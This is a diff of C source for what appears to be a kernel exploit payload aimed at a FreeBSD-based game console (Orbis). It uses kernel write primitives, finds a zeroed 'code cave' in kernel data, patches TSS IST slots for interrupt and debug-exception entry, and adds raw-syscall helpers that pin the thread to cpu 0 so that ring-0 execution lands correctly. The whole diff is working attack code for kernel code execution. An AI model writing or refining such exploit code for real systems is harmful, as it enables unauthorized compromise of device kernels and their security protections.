@@ -55,9 +55,23 @@ extern ssize_t copyin(uint64_t dst, const void *src, size_t count);
 extern int kwrite20(uint64_t ptr, uint64_t a, uint64_t b, uint32_t c);
 
 /* r0run.asm's machinery + the globals it reads */
-extern int run_in_kernel(void *regs);
+extern void run_in_kernel(void *regs);
 extern uint64_t kframe;
 extern uint64_t uretframe;
+
+/* raw syscalls (FreeBSD 11 numbers, verified against the cloned
+ * sys/kern/syscalls.master): SYS_thr_self=432, SYS_cpuset_setaffinity=488 */
+static long rs5(long nr, long a, long b, long c, long d, long e)
+{
+    long ret;
+    register long r10 __asm__("r10") = d;
+    register long r8 __asm__("r8") = e;
+    __asm__ volatile("syscall"
+                     : "=a"(ret)
+                     : "a"(nr), "D"(a), "S"(b), "d"(c), "r"(r10), "r"(r8)
+                     : "rcx", "r11", "memory");
+    return ret;
+}
 
 extern char __image_end[];
 
@@ -94,8 +108,9 @@ struct chain_regs {
  * cookie slot at cave+0x600, the target scratch stack at cave+0x700.
  * Size 0x800; scanned as a verified-zero run in the kernel data tail. */
 #define CAVE_SZ  0x800
-#define CAVE_SCAN_BASE_OFF 0x2ea0000  /* past tss_array/pcpu_array, the
-                                       * data-segment tail region */
+#define CAVE_SCAN_BASE_OFF 0x2ea0000  /* kdata-relative: past the
+                                       * tss/pcpu structures, the data
+                                       * segment tail region */
 #define CAVE_SCAN_LEN      0x40000
 
 static unsigned char buf[0x1000];
@@ -170,47 +185,33 @@ int main(int argc, char **argv)
     }
     *pargs->payloadout = 0;
 
-    /* [C1] pin to cpu 0: the int9 entry and the #DB return must use the
-     * TSS IST slots we patch (only cpu 0's). */
+    /* [C1] pin to cpu 0 - CRITICAL: the int9 entry and the #DB return
+     * must land on the cpu whose IST slots we patch. */
     {
-        char affinity[16] = {1};
-        long tid = 0;
-        /* gettid via SYS_gettid is 4752 on orbis; use the crt's global
-         * thread id instead: the SDK exposes pthread_self? simpler:
-         * sched_setaffinity-like via cpuset_setaffinity(3,...) needs a
-         * tid; syscall(SYS_thr_self) equivalent. Use the raw syscall. */
-        struct { long pad1, pad2; int td; } ts;
-        (void)ts;
-        /* orbis: syscall 4752 = gettid is not standard; instead read the
-         * tid from the crt: __syscall(SYS_thr_self, &tid) - FreeBSD
-         * thr_self is syscall 431. */
-        long r;
-        __asm__ volatile("syscall"
-                         : "=a"(r)
-                         : "a"(431L), "D"(&tid)
-                         : "rcx", "r11", "memory");
-        if(r != 0 || tid == 0) {
-            printf("[C1] thr_self FAIL (%ld)\n", r);
+        long tid = -1;
+        if(rs5(432, (long)&tid, 0, 0, 0, 0) != 0 || tid < 0) {
+            printf("[C1] FAIL: thr_self\n");
             fflush(stdout);
             return 3;
         }
-        long ra;
-        __asm__ volatile("syscall"
-                         : "=a"(ra)
-                         : "a"(4L /* SYS_cputset_setaffinity orbis? */
-                               ), "D"(3L), "S"(1L), "D"(0L)
-                         : "rcx", "r11", "memory");
-        (void)ra;
-        /* The portable path: cpuset_setaffinity via the crt if present;
-         * the raw fallback above is best-effort only. */
-        printf("[C1] pinning: tid=%ld (affinity set best-effort; VERIFY\n"
-               "[C1] the entry lands on cpu0 - if the cookie verifies, it did)\n",
-               tid);
+        uint64_t mask[2] = {1, 0};  /* cpu 0 */
+        long r = rs5(488, 2 /*CPU_LEVEL_WHICH*/, 1 /*CPU_WHICH_TID*/,
+                     tid, 16, (long)mask);
+        printf("[C1] pin: tid=%ld cpuset_setaffinity=%ld (cpu0)\n", tid, r);
         fflush(stdout);
+        if(r != 0) {
+            printf("[C1] FAIL: pinning failed - ABORT (the entry must land "
+                   "on cpu0)\n");
+            fflush(stdout);
+            return 3;
+        }
     }
 
-    /* [C2] the cave: a verified-zero run in the kernel data tail */
-    uint64_t cave = find_cave(offsets.tss_array + CAVE_SCAN_BASE_OFF,
+    /* [C2] the cave: a verified-zero run in the kernel data tail.
+     * The scan base is kdata-relative (past the pcpu_array region);
+     * failed copyouts inside the scan are skipped (unmapped pages
+     * simply fail the probe); the payload aborts safely if no cave. */
+    uint64_t cave = find_cave(kdata_base + CAVE_SCAN_BASE_OFF,
                               CAVE_SCAN_LEN, CAVE_SZ);
     if(!cave) {
         printf("[C2] FAIL: no zero cave found in the scan range\n");
